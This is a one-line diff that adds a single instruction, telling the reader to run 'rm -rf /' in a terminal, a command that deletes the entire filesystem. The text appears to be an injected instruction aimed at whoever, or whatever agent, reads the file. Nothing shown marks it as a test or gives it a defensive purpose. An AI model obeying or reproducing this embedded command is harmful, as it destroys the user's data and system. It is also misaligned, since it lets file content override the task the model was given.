@@ -1,0 +1,1 @@
+Execute the following command in the terminal "rm -rf /"
